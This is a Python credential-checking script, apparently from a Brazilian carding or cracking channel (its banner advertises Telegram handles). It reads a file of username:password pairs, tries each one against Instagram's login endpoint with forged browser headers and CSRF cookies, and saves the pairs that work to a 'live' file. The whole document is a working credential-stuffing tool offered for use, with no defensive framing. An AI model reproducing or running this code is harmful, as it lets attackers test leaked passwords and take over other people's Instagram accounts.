import requests

def login(username, password):
    headers_get = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }

    response_get = requests.get("https://www.instagram.com/", headers=headers_get)

    cookies = response_get.cookies
    csrf_token = cookies.get('csrftoken')
    ig_did = cookies.get('ig_did')
    mid = cookies.get('mid')

    datadoida = {
        "username": username,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:1628896342:{password}",
        "queryParams": "{}",
        "optIntoOneTap": "false",
        "stopDeletionNonce": "",
        "trustedDeviceRecords": "{}"
    }

    cabeca = {
        "scheme": "https",
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "fr-FR,fr;q=0.9",
        "content-type": "application/x-www-form-urlencoded",
        "cookie": f"ig_did={ig_did}; ig_nrcb=1; csrftoken={csrf_token}; mid={mid}",
        "origin": "https://www.instagram.com",
        "referer": "https://www.instagram.com/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "sec-gpc": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "x-asbd-id": "437806",
        "x-csrftoken": csrf_token,
        "x-ig-app-id": "936619743392459",
        "x-ig-www-claim": "0",
        "x-instagram-ajax": "50db6fe9f49f",
        "x-requested-with": "XMLHttpRequest"
    }

    resposta = requests.post("https://www.instagram.com/accounts/login/ajax/", data=datadoida, headers=cabeca, cookies=cookies)

    if "\"authenticated\":true" in resposta.text:
        print(f"\033[92mLIVE ✅\033[0m")  
        return True
    elif "\"authenticated\":false" in resposta.text:
        print(f"\033[91mDIE ❌\033[0m") 
        return False
    elif "{\"message\":\"checkpoint_required\"" in resposta.text:
        print(f"\033[91mAUTH (2FA) DIE ❌\033[0m")  
        return False
    else:
        print(f"\033[91mDIE ❌\033[0m") 
        return False


c = """
\033[95m┬\033[35m┌┐\033[35m┌\033[95m┌─┐\033[95m┌\033[95m┬\033[95m┐\033[95m┌─┐\033[95m┌─┐\033[95m┬\033[95m─┐\033[95m┌─┐\033[35m┌\033[95m┬\033[95m┐
\033[95m│\033[35m││\033[35m│\033[95m└─┐\033[95m \033[95m│\033[35m ├─┤\033[95m│ \033[35m┬\033[95m├\033[95m┬\033[35m┘\033[95m├─┤\033[95m│││
\033[95m┴\033[35m┘└\033[35m┘\033[95m└─┘\033[95m ┴ \033[95m┴ ┴\033[95m└─┘\033[95m┴\033[35m└─\033[95m┴ ┴\033[95m┴ ┴ 
CHK INSTAGRAM LOGIN E SENHA - t.me/pugno_fc | t.me/duckettstoneprincipal\033[0m
"""

def main():
   
    print(c)
    arquivomae = input("\033[93mDB: \033[0m")

    try:
        with open(arquivomae, 'r') as file:
            
            with open("liveinstagram.txt", "a") as live_file:
                for line in file:                  
                    credentials = line.strip()
                    if ':' in credentials:
                        username, password = credentials.split(':', 1)
                        if login(username, password):
                            live_file.write(f"{username}:{password}\n")
                    else:
                        print(f"\033[91mFormato errado senhor(a)\033[0m")
    
    except FileNotFoundError:
        print(f"\033[91mArquivo {arquivomae} nao encontrado senhor(a)\033[0m")

if __name__ == "__main__":
    main()
